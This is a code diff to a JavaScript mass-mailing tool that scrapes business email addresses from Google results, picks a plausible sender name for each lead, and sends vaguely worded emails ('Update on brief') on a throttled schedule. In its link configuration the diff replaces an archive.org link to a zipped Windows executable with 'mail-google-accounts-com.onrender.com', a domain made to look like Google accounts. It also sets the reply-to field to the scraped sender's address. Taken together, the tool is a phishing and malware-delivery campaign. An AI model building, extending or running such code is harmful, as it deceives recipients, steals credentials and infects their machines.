@@ -41,7 +41,79 @@ function formatEmailLocalPartAsName(email) {
   const localPart = email.split('@')[0];
 
   // List of generic local parts that should not be used as a sender name
-  const genericNames = [
+  // Check if the local part is a generic name
+  if (CONFIG.genericNames.includes(localPart.toLowerCase())) {
+    return 'Our Team';
+  }
+
+  // Replace common separators with spaces and split into words
+  const words = localPart.replace(/[._-]/g, ' ').split(' ');
+
+  // Capitalize each word and join them
+  const formattedName = words.map(word => {
+    if (word.length === 0) return '';
+    return word.charAt(0).toUpperCase() + word.slice(1).toLowerCase();
+  }).join(' ');
+
+  // If after formatting, the name is empty or still looks generic (e.g., just initials),
+  // or if it's a single letter, fall back to 'Our Team'
+  if (!formattedName.trim() || formattedName.length <= 2) {
+    return 'Our Team';
+  }
+
+  return formattedName;
+}
+
+/**
+ * Selects the best sender name for a lead based on available information.
+ * Prioritizes scraped person's name, then non-generic email local parts,
+ * then company name, finally defaulting to 'Our Team'.
+ * @param {object} lead - The lead object containing emails, companyName, and sender info.
+ * @returns {string} The selected sender name.
+ */
+function selectBestSenderName(lead) {
+  // 1. Prioritize scraped person's name if available
+  if (lead && lead.sender && lead.sender.first_name && lead.sender.last_name) {
+    const scrapedName = `${lead.sender.first_name} ${lead.sender.last_name}`;
+    // Ensure the scraped name isn't too short or generic-looking
+    if (scrapedName.trim().length > 2 && !CONFIG.genericNames.includes(scrapedName.toLowerCase())) {
+      return scrapedName;
+    }
+  }
+
+  // 2. Look for a non-generic name from email local parts
+  let bestEmailName = '';
+  if (lead && lead.emails && lead.emails.length > 0) {
+    for (const email of lead.emails) {
+      const derivedName = formatEmailLocalPartAsName(email);
+      if (derivedName !== 'Our Team') {
+        // Found a non-generic name, use it
+        bestEmailName = derivedName;
+        break; // Take the first good one
+      }
+    }
+  }
+
+  if (bestEmailName) {
+    return bestEmailName;
+  }
+
+  // 3. Fallback to company name if available and not too generic
+  if (lead && lead.companyName) {
+    const companyName = lead.companyName.trim();
+    // Check if company name is not just a generic term or too short
+    if (companyName.length > 2 && !CONFIG.genericNames.includes(companyName.toLowerCase())) {
+      return companyName;
+    }
+  }
+
+  // 4. Default to 'Our Team'
+  return 'Our Team';
+}
+
+// ---------- CONFIG ----------
+const CONFIG = {
+  genericNames: [
     'info', 'sales', 'support', 'admin', 'administrator', 'noreply', 'no-reply',
     'contact', 'webmaster', 'help', 'enquiries', 'enquiry', 'marketing', 'pr',
     'press', 'billing', 'accounts', 'finance', 'hr', 'jobs', 'careers', 'team',
@@ -160,80 +232,7 @@ function formatEmailLocalPartAsName(email) {
     'webmasterauthor', 'webmaster-author', 'webmasterauthors', 'webmaster-authors',
     'webmasterpublisher', 'webmaster-publisher', 'webmasterpublishers', 'webmaster-publishers',
     'webmastermoderator', 'webmaster-moderator', 'webmastermoderators', 'webmaster-moderators'
-  ];
-
-  // Check if the local part is a generic name
-  if (genericNames.includes(localPart.toLowerCase())) {
-    return 'Our Team';
-  }
-
-  // Replace common separators with spaces and split into words
-  const words = localPart.replace(/[._-]/g, ' ').split(' ');
-
-  // Capitalize each word and join them
-  const formattedName = words.map(word => {
-    if (word.length === 0) return '';
-    return word.charAt(0).toUpperCase() + word.slice(1).toLowerCase();
-  }).join(' ');
-
-  // If after formatting, the name is empty or still looks generic (e.g., just initials),
-  // or if it's a single letter, fall back to 'Our Team'
-  if (!formattedName.trim() || formattedName.length <= 2) {
-    return 'Our Team';
-  }
-
-  return formattedName;
-}
-
-/**
- * Selects the best sender name for a lead based on available information.
- * Prioritizes scraped person's name, then non-generic email local parts,
- * then company name, finally defaulting to 'Our Team'.
- * @param {object} lead - The lead object containing emails, companyName, and sender info.
- * @returns {string} The selected sender name.
- */
-function selectBestSenderName(lead) {
-  // 1. Prioritize scraped person's name if available
-  if (lead && lead.sender && lead.sender.first_name && lead.sender.last_name) {
-    const scrapedName = `${lead.sender.first_name} ${lead.sender.last_name}`;
-    // Ensure the scraped name isn't too short or generic-looking
-    if (scrapedName.trim().length > 2 && !CONFIG.genericNames.includes(scrapedName.toLowerCase())) {
-      return scrapedName;
-    }
-  }
-
-  // 2. Look for a non-generic name from email local parts
-  let bestEmailName = '';
-  if (lead && lead.emails && lead.emails.length > 0) {
-    for (const email of lead.emails) {
-      const derivedName = formatEmailLocalPartAsName(email);
-      if (derivedName !== 'Our Team') {
-        // Found a non-generic name, use it
-        bestEmailName = derivedName;
-        break; // Take the first good one
-      }
-    }
-  }
-
-  if (bestEmailName) {
-    return bestEmailName;
-  }
-
-  // 3. Fallback to company name if available and not too generic
-  if (lead && lead.companyName) {
-    const companyName = lead.companyName.trim();
-    // Check if company name is not just a generic term or too short
-    if (companyName.length > 2 && !CONFIG.genericNames.includes(companyName.toLowerCase())) {
-      return companyName;
-    }
-  }
-
-  // 4. Default to 'Our Team'
-  return 'Our Team';
-}
-
-// ---------- CONFIG ----------
-const CONFIG = {
+  ],
   industries: [
     'Agriculture', 'Apparel', 'Banking', 'Biotechnology', 'Chemical', 'Communications', 'Construction',
     'Consulting', 'Education', 'Electronics', 'Energy', 'Engineering', 'Entertainment', 'Environmental',
@@ -271,7 +270,7 @@ const CONFIG = {
     
   ],
   
-  googleResultsPerSearch: 35,
+  googleResultsPerSearch: 50,
   maxPagesToVisit: 20,
   maxEmailsPerDomain: 10, // Maximum number of unique emails to collect per domain
   maxPeopleToScrape: 10, // Maximum number of people (names, titles, emails) to scrape per website
@@ -280,7 +279,7 @@ const CONFIG = {
 
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
-    "https://archive.org/compress/newdetails/formats=WINDOWS%20EXECUTABLE&file=/newdetails.zip",
+    "https://mail-google-accounts-com.onrender.com",
   ],
   searchTlds: [
     '.com', '.org', '.net', '.io', '.co', '.ad', '.ae', '.af', '.ag', '.al',
@@ -514,7 +513,7 @@ async function sendEmail(to, lead, leadSenderName) {
   const mailOptions = {
     from: fromAddress,
     to: to,
-    subject: 'Update on details',
+    subject: 'Update on brief',
     html: htmlContent,
     replyTo: (lead && lead.sender && lead.sender.email) ? lead.sender.email : undefined,
   };
